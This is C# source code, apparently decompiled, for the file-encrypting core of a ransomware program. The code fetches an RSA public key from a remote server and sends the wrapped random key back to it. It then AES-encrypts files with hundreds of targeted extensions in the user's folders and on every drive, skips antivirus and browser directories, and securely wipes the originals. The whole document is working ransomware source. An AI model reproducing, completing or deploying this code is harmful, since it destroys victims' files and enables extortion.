using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Security;

namespace abc;

internal class Encryptor
{
	private const int saltLength = 8;

	private const int ivLength = 16;

	private const int passwordLength = 16;

	private const int intLength = 4;

	private static string motto = "(:AB HONESTO VIRUM BONUM NIHIL DETERRET:)";

	private static string[] skipwords = new string[15]
	{
		"360safe", "360 Internet Security", "360Chrome", "Total Security", "Internet Explorer", "Chrome", "QQPCMgr", "Sogou", "Firefox", "Safari",
		"Opera", "Kaspersky", "Rising", "UCbrowser", "maxthon"
	};

	private static HashSet<string> validExtensions = new HashSet<string>
	{
		".001", ".1cd", ".3fr", ".3gp", ".7z", ".DayZProfile", ".ac3", ".acc", ".accdb", ".ai",
		".ape", ".apk", ".arch00", ".arw", ".asp", ".asset", ".avi", ".bak", ".bar", ".bay",
		".bc6", ".bc7", ".big", ".bik", ".bkf", ".bkp", ".blob", ".bmp", ".bsa", ".bson",
		".cas", ".cdr", ".cer", ".cfr", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".css",
		".csv", ".d3dbsp", ".das", ".dat", ".dazip", ".db", ".db0", ".dbf", ".dbfv", ".dcr",
		".der", ".desc", ".divx", ".djvu", ".dmp", ".dng", ".doc", ".docm", ".docx", ".dwg",
		".dxf", ".dxg", ".epk", ".eps", ".epub", ".erf", ".esm", ".exif", ".ff", ".flac",
		".flv", ".forge", ".fos", ".fpk", ".fsh", ".gdb", ".gho", ".gif", ".gzip", ".h",
		".hkdb", ".hkx", ".hplg", ".htm", ".html", ".hvpl", ".ibank", ".icxs", ".ifo", ".indd",
		".iso", ".itdb", ".itl", ".itm", ".iwd", ".iwi", ".java", ".jfif", ".jpeg", ".jpg",
		".js", ".jsp", ".kdb", ".kdc", ".kf", ".kwm", ".layout", ".lbf", ".litemod", ".lrf",
		".ltx", ".lvl", ".m2", ".m2v", ".m3u", ".m4a", ".map", ".max", ".mcgame", ".mcmeta",
		".md", ".mdb", ".mdbackup", ".mddata", ".mdf", ".mef", ".menu", ".mkv", ".mlx", ".mov",
		".mp3", ".mp4", ".mpeg", ".mpg", ".mpqge", ".mrw", ".mrwref", ".myd", ".ncf", ".nef",
		".nrw", ".ntl", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
		".p7b", ".p7c", ".pak", ".pdd", ".pdf", ".pef", ".pem", ".pfx", ".php", ".pkpass",
		".png", ".pps", ".ppt", ".pptm", ".pptx", ".psd", ".psk", ".pst", ".ptx", ".pwm",
		".py", ".qbb", ".qbw", ".qdf", ".qic", ".r3d", ".raf", ".rar", ".raw", ".rb",
		".rdf", ".re4", ".rgss3a", ".rim", ".rofl", ".rtf", ".rw2", ".rwl", ".sav", ".sb",
		".sc2save", ".sid", ".sidd", ".sidn", ".sie", ".sis", ".slm", ".snx", ".sql", ".sqlite",
		".sr2", ".srf", ".srw", ".sum", ".svg", ".syncdb", ".t12", ".t13", ".tar", ".tax",
		".tif", ".tor", ".torrent", ".txt", ".unity3d", ".upk", ".vdf", ".vfs0", ".vob", ".vpk",
		".vpp_pc", ".vtf", ".w3x", ".wav", ".wb2", ".wma", ".wmo", ".wmv", ".wotreplay", ".wpd",
		".wps", ".x3f", ".xf", ".xlk", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xml", ".xxx",
		".zip", ".ztmp"
	};

	public static bool makeItHappen()
	{
		byte[] pwdBytes = CreatePassword(16);
		int count = saveKey(pwdBytes);
		if (count > 0)
		{
			try
			{
				string[] drives = Form1.drives;
				pwdBytes = SHA256.Create().ComputeHash(pwdBytes);
				byte[] mottoBytes = Encoding.UTF8.GetBytes(motto);
				encryptDirectory(Form1.userDir + "Desktop", pwdBytes, count, mottoBytes);
				encryptDirectory(Form1.userDir + "Documents", pwdBytes, count, mottoBytes);
				encryptDirectory(Form1.userDir + "Music", pwdBytes, count, mottoBytes);
				encryptDirectory(Form1.userDir + "Pictures", pwdBytes, count, mottoBytes);
				encryptDirectory(Form1.userDir + "Videos", pwdBytes, count, mottoBytes);
				string[] array = drives;
				foreach (string path in array)
				{
					new Thread((ThreadStart)delegate
					{
						encryptDirectory(path, pwdBytes, count, mottoBytes);
					}).Start();
				}
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	public static int saveKey(byte[] pwdBytes)
	{
		byte[] array = encryptPwd(Network.getKey(0), pwdBytes);
		string text = null;
		if (array != null)
		{
			text = Network.saveCipher(Convert.ToBase64String(array), 0);
			if (text.StartsWith("success", StringComparison.Ordinal))
			{
				return int.Parse(text.Split(new char[1] { ' ' })[1]);
			}
			return 0;
		}
		return 0;
	}

	public static byte[] encryptPwd(string publicKey, byte[] pwdBytes)
	{
		try
		{
			if (publicKey != null)
			{
				using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
				{
					rSACryptoServiceProvider.FromXmlString(publicKey);
					byte[] result = RSAEncrypt(pwdBytes, rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false), DoOAEPPadding: false);
					Array.Clear(pwdBytes, 0, pwdBytes.Length);
					return result;
				}
			}
			return null;
		}
		catch (ArgumentNullException)
		{
			Console.WriteLine("Encryption failed.");
			return null;
		}
	}

	private static byte[] RSAEncrypt(byte[] DataToEncrypt, RSAParameters RSAKeyInfo, bool DoOAEPPadding)
	{
		try
		{
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.ImportParameters(RSAKeyInfo);
			return rSACryptoServiceProvider.Encrypt(DataToEncrypt, DoOAEPPadding);
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine(ex.Message);
			return null;
		}
	}

	private static void AES_Encrypt(string path, string newPath, byte[] passwordBytes, int count, byte[] mottoBytes)
	{
		byte[] array = new byte[8];
		FileStream fileStream = new FileStream(newPath, FileMode.Open);
		using FileStream fileStream2 = new FileStream(path, FileMode.Create);
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.IV = GetRandomBytes(aesCryptoServiceProvider.BlockSize / 8);
		Array.Copy(aesCryptoServiceProvider.IV, array, 8);
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, array, 1000);
		aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		byte[] array2 = new byte[1048576];
		fileStream2.Write(mottoBytes, 0, mottoBytes.Length);
		byte[] bytes = BitConverter.GetBytes(count);
		fileStream2.Write(bytes, 0, 4);
		fileStream2.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream2, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
		try
		{
			int count2;
			while ((count2 = fileStream.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count2);
			}
			fileStream.Close();
		}
		catch (IOException)
		{
		}
		finally
		{
			cryptoStream.Close();
			fileStream2.Close();
			new Wiper().erase(newPath);
		}
	}

	public static byte[] CreatePassword(int length)
	{
		char[] array = Membership.GeneratePassword(length, 4).ToCharArray();
		byte[] bytes = Encoding.UTF8.GetBytes(array);
		Array.Clear(array, 0, length);
		return bytes;
	}

	private static byte[] GetRandomBytes(int length)
	{
		byte[] array = new byte[length];
		using RandomNumberGenerator randomNumberGenerator = new RNGCryptoServiceProvider();
		randomNumberGenerator.GetBytes(array);
		return array;
	}

	public static void EncryptFile(string file, byte[] pwdBytes, int count, byte[] mottoBytes)
	{
		if (file.EndsWith(Messenger.messageFile, StringComparison.Ordinal))
		{
			return;
		}
		try
		{
			FileStream fileStream = new FileStream(file, FileMode.Open);
			byte[] array = new byte[mottoBytes.Length];
			fileStream.Read(array, 0, mottoBytes.Length);
			fileStream.Close();
			if (!array.SequenceEqual(mottoBytes))
			{
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file);
				File.Move(file, fileNameWithoutExtension);
				AES_Encrypt(file, fileNameWithoutExtension, pwdBytes, count, mottoBytes);
				Form1.SaveToRegistry(file, "\\File", count);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void encryptDirectory(string location, byte[] pwdBytes, int count, byte[] mottoBytes)
	{
		if (location.Equals(Form1.SYSTEM_PATH, StringComparison.Ordinal) || skipwords.Any(location.Contains))
		{
			return;
		}
		string[] array = new string[0];
		string[] array2 = new string[0];
		try
		{
			array = Directory.GetFiles(location);
			array2 = Directory.GetDirectories(location);
		}
		catch (IOException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		for (int i = 0; i < array.Length; i++)
		{
			string extension = Path.GetExtension(array[i]);
			if (validExtensions.Contains(extension))
			{
				EncryptFile(array[i], pwdBytes, count, mottoBytes);
			}
		}
		for (int j = 0; j < array2.Length; j++)
		{
			encryptDirectory(array2[j], pwdBytes, count, mottoBytes);
		}
	}

	protected virtual bool IsFileLocked(FileInfo file)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None);
		}
		catch (IOException)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}
}
